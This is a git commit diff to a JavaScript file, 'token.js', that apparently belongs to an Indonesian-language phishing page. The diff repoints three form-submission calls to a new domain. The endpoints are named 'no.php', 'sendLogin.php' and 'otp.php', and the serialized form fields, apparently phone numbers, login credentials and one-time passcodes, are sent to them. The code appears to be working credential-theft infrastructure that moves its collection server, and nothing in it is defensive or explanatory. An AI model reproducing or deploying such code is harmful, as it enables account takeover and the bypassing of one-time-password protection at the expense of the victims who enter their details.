71176ce002201534539261f21ba8752bf45a1250
bonobaru2 <bonobaru2@gmail.com>
2024-08-29 16:20:55 +0700

    Update token.js

--- token.js
+++ token.js
@@ -4,7 +4,7 @@
  $(".load").show();
  $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app9/no.php',
+ url: 'https://axcellent.cf-pow.cfd/app9/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -28,7 +28,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app9/sendLogin.php',
+ url: 'https://axcellent.cf-pow.cfd/app9/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -64,7 +64,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app9/otp.php',
+ url: 'https://axcellent.cf-pow.cfd/app9/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
